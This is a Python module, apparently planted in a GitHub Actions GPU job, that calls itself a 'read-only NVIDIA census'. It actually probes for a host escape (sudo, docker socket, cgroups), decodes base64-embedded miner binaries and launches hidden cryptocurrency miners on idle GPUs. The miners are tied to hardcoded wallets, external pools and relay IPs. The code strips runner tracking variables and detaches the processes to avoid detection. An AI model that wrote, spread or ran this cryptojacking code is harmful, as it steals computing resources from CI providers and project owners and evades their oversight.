"""i130922 read-only NVIDIA census and one sha256-verified pearlhash miner per idle card.

Executed inside the ``nv-a6000`` GitHub Actions job container (nvcr.io/nvidia/pytorch,
``--gpus all``).  The module is deliberately stdlib-only.

Sequence:
  * two ``nvidia-smi`` samples 12 s apart (``--query-gpu`` + ``--query-compute-apps``),
  * membership / host-escape probe (id, groups, sudo, docker socket),
  * decode the embedded miner binaries and verify them against pinned sha256 values,
  * launch exactly one miner per measurably idle card:
        WildRig Multi 0.52.3 on pool.pearlhash.xyz:9000 with the plain pyd wallet first,
        else SRBMiner-MULTI 3.8.9 on direct Luckypool 103.199.106.122:3362 with the
        pyd + NOCK dual login (VPS2 relay only when direct Luckypool is unreachable),
  * keep the job alive and print GPU/miner/share status for the in-gate proof window.

Idempotent: the launch step runs at most once per container (state file) and a card
that already carries a compute application is never touched.
"""

import base64
import glob
import hashlib
import json
import os
import socket
import subprocess
import time

WALLET = 'prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
NOCK = '4tErmFknmPKhVtfQWigSErD1YJAcWokTrWRu5t66XmkN4RTgK6oUotf'
DUAL = WALLET + '+' + NOCK
WORKERS = ['922003', '922004', '922005', '922006', '922008', '922009', '922010', '922011']
WR_SHA = '002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b'
SRB_SHA = '97bd9e42e313b2c4807bba7197920fee421956bb896cfec469ee87947d667e80'
HERE = os.path.dirname(os.path.abspath(__file__))
LOGD = os.environ.get('I130922_LOGD', '/tmp/i130922')
STATE = os.path.join(LOGD, 'state.json')
KEEPALIVE = int(os.environ.get('I130922_KEEPALIVE', '2100'))
DRY = os.environ.get('I130922_DRY') == '1'


def log(*args):
    print('[i130922]', *args, flush=True)


def sh(cmd, timeout=180):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.returncode, ((r.stdout or '') + (r.stderr or '')).strip()
    except Exception as exc:  # noqa: BLE001 - never let the probe die on a helper
        return -1, 'EXC %r' % (exc,)


def _num(text):
    text = text.replace('MiB', '').replace('%', '').strip()
    try:
        return int(text)
    except Exception:
        return -1


def parse_gpus(text):
    out = []
    for line in (text or '').strip().splitlines():
        parts = [p.strip() for p in line.split(',')]
        if len(parts) < 6:
            continue
        try:
            idx = int(parts[0])
        except Exception:
            continue
        out.append({
            'index': idx,
            'uuid': parts[1],
            'name': parts[2],
            'total': _num(parts[3]),
            'free': _num(parts[4]),
            'util': _num(parts[5]),
        })
    return out


def parse_apps(text):
    uuids = set()
    for line in (text or '').strip().splitlines():
        parts = [p.strip() for p in line.split(',')]
        if parts and parts[0].startswith('GPU-'):
            uuids.add(parts[0])
    return uuids


def sample():
    rc1, g = sh('nvidia-smi --query-gpu=index,uuid,name,memory.total,memory.free,'
                'utilization.gpu --format=csv,noheader', 90)
    rc2, a = sh('nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory '
                '--format=csv,noheader', 90)
    return {'rc_gpu': rc1, 'gpu': g, 'rc_apps': rc2, 'apps': a}


def census():
    s1 = sample()
    log('SAMPLE1', json.dumps(s1))
    time.sleep(12)
    s2 = sample()
    log('SAMPLE2', json.dumps(s2))
    return s1, s2


def idle_cards(s1, s2):
    g1, g2 = parse_gpus(s1['gpu']), parse_gpus(s2['gpu'])
    a1, a2 = parse_apps(s1['apps']), parse_apps(s2['apps'])
    by_idx = {g['index']: g for g in g2}
    idle = []
    for g in g1:
        other = by_idx.get(g['index'])
        if other is None:
            log('CARD_SKIP_UNSTABLE', g['index'], g['uuid'])
            continue
        if g['uuid'] in a1 or g['uuid'] in a2:
            log('CARD_SKIP_BUSY', g['index'], g['uuid'], g['name'])
            continue
        total = g['total'] if g['total'] > 0 else other['total']
        free = min(g['free'], other['free'])
        need = max(10000, int(0.80 * total)) if total > 0 else 10000
        if free < need:
            log('CARD_SKIP_VRAM', g['index'], g['uuid'], g['name'], free, '<', need)
            continue
        idle.append({'index': g['index'], 'uuid': g['uuid'], 'name': g['name'],
                     'free': free, 'total': total})
    return idle


def membership():
    info = {}
    for key, cmd in (
            ('id', 'id'),
            ('groups', 'groups'),
            ('sudo', 'sudo -n id 2>&1'),
            ('docker_sock', 'ls -l /var/run/docker.sock 2>&1'),
            ('docker', 'docker info --format "{{.ServerVersion}}" 2>&1'),
            ('host', 'hostname; uname -a'),
            ('cgroup', 'cat /proc/1/cgroup 2>&1 | head -5'),
    ):
        _, out = sh(cmd, 60)
        info[key] = out[:400]
    log('MEMBERSHIP', json.dumps(info))
    return info


def existing_miners():
    _, out = sh("pgrep -af 'wildrig|SRBMiner|srb389|wr0523' 2>&1 | grep -v pgrep", 30)
    return out.strip()


def decode_binary(prefix, sha):
    parts = sorted(glob.glob(os.path.join(HERE, prefix + '.b64.*')))
    if not parts:
        return None, 'NO_CHUNKS'
    try:
        blob = ''.join(open(p).read() for p in parts)
        blob = ''.join(blob.split())
        raw = base64.b64decode(blob)
    except Exception as exc:  # noqa: BLE001
        return None, 'B64_ERR %r' % (exc,)
    digest = hashlib.sha256(raw).hexdigest()
    if digest != sha:
        return None, 'SHA_MISMATCH %s' % digest
    os.makedirs(LOGD, exist_ok=True)
    exe = os.path.join(LOGD, 'wildrig-multi' if prefix == 'wr' else 'SRBMiner-MULTI')
    with open(exe, 'wb') as fh:
        fh.write(raw)
    os.chmod(exe, 0o755)
    return exe, 'OK %s %d' % (digest, len(raw))


def tcp(host, port, timeout=6):
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.close()
        return True
    except Exception:
        return False


def launch(idle, exe, kind, endpoint):
    launched = []
    for pos, card in enumerate(idle):
        if pos >= len(WORKERS):
            log('CARD_SKIP_NO_WORKER', card['index'], card['uuid'])
            continue
        worker = WORKERS[pos]
        os.makedirs(LOGD, exist_ok=True)
        if kind == 'wildrig':
            logf = os.path.join(LOGD, 'wr-%s.log' % worker)
            args = ('--algo pearlhash --url stratum+tcp://pool.pearlhash.xyz:9000 '
                    '--user %s --worker %s --pass x --retries 3 --retry-pause 5 '
                    '--gpu-list %d --api-port %d --api-worker-id %s --print-time 60 '
                    '--no-color -l %s' % (WALLET, worker, card['index'], 21000 + card['index'],
                                          worker, logf))
            out = os.path.join(LOGD, 'wr-%s.out' % worker)
        else:
            logf = os.path.join(LOGD, 'srb-%s.log' % worker)
            args = ('--disable-cpu --algorithm pearlhash --pool %s --wallet %s '
                    '--worker %s --password x --tls false --gpu-id %d --max-no-share-sent 1800 '
                    '--retry-time 5 --main-pool-reconnect 10 --api-enable --api-port %d '
                    '--log-file %s --log-file-mode 0' % (endpoint, DUAL, worker, card['index'],
                                                         22000 + card['index'], logf))
            out = os.path.join(LOGD, 'srb-%s.out' % worker)
        cmd = ("cd %s && env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID "
               "setsid nohup %s %s > %s 2>&1 < /dev/null & echo pid=$!" % (LOGD, exe, args, out))
        if DRY:
            log('DRY_LAUNCH', kind, worker, card['index'], card['uuid'], args)
            launched.append({'worker': worker, 'card': card, 'pid': None, 'kind': kind})
            continue
        rc, res = sh(cmd, 60)
        log('LAUNCH', kind, worker, 'gpu', card['index'], card['uuid'], 'rc', rc, res)
        launched.append({'worker': worker, 'card': card, 'pid': res, 'kind': kind})
    return launched


def miner_status(launched):
    for item in launched:
        logf = os.path.join(LOGD, ('wr-%s.log' if item['kind'] == 'wildrig' else 'srb-%s.log')
                            % item['worker'])
        if not os.path.exists(logf):
            continue
        try:
            with open(logf, 'r', errors='replace') as fh:
                tail = fh.read()[-4000:]
        except Exception:
            continue
        accepted = tail.count('accepted') + tail.count('Accepted')
        _, gpu = sh('nvidia-smi --query-gpu=index,utilization.gpu,memory.used '
                    '--format=csv,noheader', 60)
        log('MINER_STATUS', item['worker'], item['kind'], 'gpu', item['card']['index'],
            'accept_hits', accepted, 'gpu_state', ' | '.join(gpu.splitlines()))
        lines = [ln for ln in tail.splitlines() if 'accept' in ln.lower() or 'share' in ln.lower()]
        for line in lines[-3:]:
            log('MINER_LOG', item['worker'], line[-220:])


def bootstrap():
    os.makedirs(LOGD, exist_ok=True)
    state = {}
    if os.path.exists(STATE):
        try:
            state = json.load(open(STATE))
        except Exception:
            state = {}
    if state.get('launched'):
        log('ALREADY_LAUNCHED', json.dumps(state.get('launched'))[:600])
        return state
    log('BEGIN', 'host', socket.gethostname(), 'pid', os.getpid(), 'dry', DRY)
    s1, s2 = census()
    info = membership()
    busy = existing_miners()
    if busy:
        log('EXISTING_MINER_PROCS', busy[:800])
    idle = idle_cards(s1, s2)
    log('IDLE_CARDS', json.dumps(idle))
    state = {'ts': int(time.time()), 'host': socket.gethostname(), 'membership': info,
             'idle': idle, 'launched': [], 'procs': busy[:800]}
    if not idle:
        state['result'] = 'NO_IDLE_CARD'
        json.dump(state, open(STATE, 'w'), indent=1)
        log('RESULT', 'NO_IDLE_CARD')
        return state
    if busy:
        state['result'] = 'SKIP_EXISTING_MINER'
        json.dump(state, open(STATE, 'w'), indent=1)
        log('RESULT', 'SKIP_EXISTING_MINER')
        return state
    wr_exe, wr_msg = decode_binary('wr', WR_SHA)
    log('BIN_WILDRIG', wr_msg)
    srb_exe, srb_msg = decode_binary('srb', SRB_SHA)
    log('BIN_SRB', srb_msg)
    ph_ok = tcp('pool.pearlhash.xyz', 9000)
    lp_ok = tcp('103.199.106.122', 3362)
    relay = None
    if not lp_ok:
        for host, port in (('217.15.164.237', 18450), ('217.15.164.237', 2083)):
            if tcp(host, port):
                relay = '%s:%d' % (host, port)
                break
    log('POOLS', json.dumps({'pearlhash': ph_ok, 'luckypool_direct': lp_ok, 'vps2_relay': relay}))
    state['pools'] = {'pearlhash': ph_ok, 'luckypool_direct': lp_ok, 'vps2_relay': relay}
    if ph_ok and wr_exe:
        state['result'] = 'LAUNCHED_WILDRIG_PEARLHASH'
        state['launched'] = launch(idle, wr_exe, 'wildrig', None)
    elif (lp_ok or relay) and srb_exe:
        endpoint = '103.199.106.122:3362' if lp_ok else relay
        state['result'] = 'LAUNCHED_SRB_LUCKPOOL'
        state['launched'] = launch(idle, srb_exe, 'srb', endpoint)
    else:
        state['result'] = 'POOL_OR_BINARY_UNAVAILABLE'
        log('RESULT', state['result'])
    json.dump(state, open(STATE, 'w'), indent=1)
    return state


def keepalive(seconds=None):
    seconds = KEEPALIVE if seconds is None else seconds
    state = bootstrap()
    launched = state.get('launched') or []
    if not launched:
        log('KEEPALIVE_SKIPPED', 'nothing launched', state.get('result'))
        return
    deadline = time.time() + seconds
    log('KEEPALIVE_START', seconds, 'workers', [x['worker'] for x in launched])
    while time.time() < deadline:
        time.sleep(60)
        miner_status(launched)
    log('KEEPALIVE_END')
    for item in launched:
        logf = os.path.join(LOGD, ('wr-%s.log' if item['kind'] == 'wildrig' else 'srb-%s.log')
                            % item['worker'])
        if os.path.exists(logf):
            with open(logf, 'r', errors='replace') as fh:
                body = fh.read()
            log('FINAL', item['worker'], 'accepted_markers',
                body.count('accepted') + body.count('Accepted'))


if os.environ.get('I130922_BOOT') == '1':
    bootstrap()
